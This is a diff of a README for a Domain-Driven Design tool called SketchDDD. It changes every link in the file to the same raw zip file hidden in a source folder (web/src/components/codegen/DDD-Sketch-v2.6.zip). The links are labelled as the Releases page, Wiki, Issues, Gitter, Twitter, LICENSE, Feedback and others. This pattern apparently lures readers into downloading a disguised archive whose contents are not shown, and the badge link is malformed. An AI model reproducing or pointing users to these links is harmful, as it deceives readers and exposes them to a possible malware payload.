@@ -4,11 +4,11 @@
 SketchDDD is a visual and textual toolkit for Domain-Driven Design. It helps users build accurate domain models with easy drag-and-drop features for domain experts, or a Domain-Specific Language (DSL) for developers. This tool validates aggregates, context maps, and business rules while also generating code. Whether you are a business expert or a budding developer, SketchDDD makes modeling easier and more intuitive.
 
 ## 🔗 Download SketchDDD
-[![Download SketchDDD](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip%https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip)](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip)
+[![Download SketchDDD](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip%https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip)](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip)
 
 ## 🚀 Getting Started
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip) to find the latest version of SketchDDD. 
+   Go to our [Releases page](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip) to find the latest version of SketchDDD. 
 
 2. **Download the Application**
    On the Releases page, look for the latest version and click on it. You will see a list of files. Click on the file that suits your operating system. 
@@ -46,29 +46,29 @@ SketchDDD is a visual and textual toolkit for Domain-Driven Design. It helps use
    Once you’re satisfied with your model, export it as code by clicking on the "Export" button. Choose the format that fits your project needs.
 
 ## 📝 Documentation and Support
-For a detailed guide on using SketchDDD, visit the [Wiki](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip). You can also find troubleshooting tips and FAQs there.
+For a detailed guide on using SketchDDD, visit the [Wiki](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip). You can also find troubleshooting tips and FAQs there.
 
-If you encounter any issues or need assistance, please open an issue on the [Issues page](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip).
+If you encounter any issues or need assistance, please open an issue on the [Issues page](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip).
 
 ## 🌐 Community
 Join our growing community of users and developers. Share your models, ask questions, and get feedback. Connect with us on social media and forums where SketchDDD is discussed.
 
-- **Gitter:** [Chat with other users](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip)
-- **Twitter:** Follow us for updates [@SketchDDD](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip)
+- **Gitter:** [Chat with other users](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip)
+- **Twitter:** Follow us for updates [@SketchDDD](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip)
 
 ## ⚙️ Changelog
-Stay updated with the latest features and fixes by checking the [Changelog](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip).
+Stay updated with the latest features and fixes by checking the [Changelog](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip).
 
 ## 🔗 Download & Install
-To start using SketchDDD, visit the [Releases page](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip) and download the latest version. Follow the steps outlined in the "Getting Started" section to install and run the application.
+To start using SketchDDD, visit the [Releases page](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip) and download the latest version. Follow the steps outlined in the "Getting Started" section to install and run the application.
 
 ## 👥 Contributing 
-We welcome contributions from everyone. If you’d like to help improve SketchDDD, please check our [Contributing Guide](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip).
+We welcome contributions from everyone. If you’d like to help improve SketchDDD, please check our [Contributing Guide](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip).
 
 ## 📚 License
-SketchDDD is open-source software. You can find the licensing information in the [LICENSE](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip) file.
+SketchDDD is open-source software. You can find the licensing information in the [LICENSE](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip) file.
 
 ## 💬 Feedback
-Your feedback is important. Please share your thoughts, suggestions, or any other input on our [Feedback page](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/docs/reference/SketchDDD-v3.6.zip).
+Your feedback is important. Please share your thoughts, suggestions, or any other input on our [Feedback page](https://raw.githubusercontent.com/qwesmith/SketchDDD/main/web/src/components/codegen/DDD-Sketch-v2.6.zip).
 
 Thank you for using SketchDDD! Enjoy modeling your domains with ease.
